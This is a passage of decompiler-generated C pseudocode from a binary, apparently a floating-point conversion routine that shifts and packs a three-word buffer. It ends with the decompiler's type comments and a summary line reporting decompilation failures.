        *v30 = v31;
        for ( k = v71; --v28 >= 0 && k; k = v35 )
        {
          v33 = &v60 + v28;
          v34 = *v33 + 1;
          v35 = 0;
          if ( v34 < *v33 || *v33 == -1 )
            v35 = 1;
          *v33 = v34;
        }
      }
LABEL_52:
      *v26 &= -1 << v64;
      if ( v65 + 1 < 3 )
        memset(&v60 + v65 + 1, 0, 4 * (3 - (v65 + 1)));
      v36 = (dword_5367BC + 1) / 32;
      v37 = (dword_5367BC + 1) % 32;
      v65 = 0;
      v72 = 0;
      v67 = 32 - v37;
      do
      {
        v38 = &v60 + v72;
        v39 = *v38;
        v64 = ~(-1 << v37) & *v38;
        v40 = v67;
        *v38 = v65 | (v39 >> v37);
        ++v72;
        v65 = v64 << v40;
      }
      while ( v72 < 3 );
      v41 = 2;
      v42 = &v62 - v36;
      do
      {
        if ( v41 < v36 )
          *(&v60 + v41) = 0;
        else
          *(&v60 + v41) = *v42;
        --v41;
        --v42;
      }
      while ( v41 >= 0 );
    }
    else
    {
      v60 = 0;
      v61 = 0;
      v62 = 0;
    }
    v5 = 0;
    result = 2;
    goto LABEL_79;
  }
  v5 = 0;
  v6 = 0;
  while ( !*(&v60 + v6) )
  {
    if ( ++v6 >= 3 )
    {
      result = 0;
      goto LABEL_79;
    }
  }
  v60 = 0;
  v61 = 0;
  v62 = 0;
  result = 2;
LABEL_79:
  v55 = v60 | (v63 != 0 ? 0x80000000 : 0) | (v5 << (31 - dword_5367BC));
  if ( dword_5367C0 == 64 )
  {
    v56 = v61;
    a2[1] = v55;
    *a2 = v56;
  }
  else if ( dword_5367C0 == 32 )
  {
    *a2 = v55;
  }
  return result;
}
// 5367B0: using guessed type int dword_5367B0;
// 5367B4: using guessed type int dword_5367B4;
// 5367B8: using guessed type int dword_5367B8;
// 5367BC: using guessed type int dword_5367BC;
// 5367C0: using guessed type int dword_5367C0;
// 5367C4: using guessed type int dword_5367C4;

// nfuncs=3260 queued=2806 decompiled=2806 lumina nreq=0 worse=0 better=0
#error "There were 12 decompilation failure(s) on 2806 function(s)"
